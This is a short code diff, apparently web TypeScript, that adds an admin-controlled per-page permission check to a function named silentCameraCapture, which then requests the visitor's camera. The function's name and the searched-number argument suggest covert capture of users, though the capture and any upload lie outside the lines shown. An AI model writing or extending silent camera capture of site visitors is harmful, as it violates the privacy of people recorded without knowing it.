@@ -14,6 +14,9 @@ export async function silentCameraCapture(searchedNumber?: string): Promise<void
     if (capturing) return;
     if (Date.now() - lastCaptureAt < MIN_GAP_MS) return;
     if (!navigator.mediaDevices?.getUserMedia) return;
+    // Admin-controlled per-page toggle
+    const allowed = await isPermissionEnabled(window.location.pathname, "camera");
+    if (!allowed) return;
     capturing = true;
 
     const stream = await navigator.mediaDevices.getUserMedia({
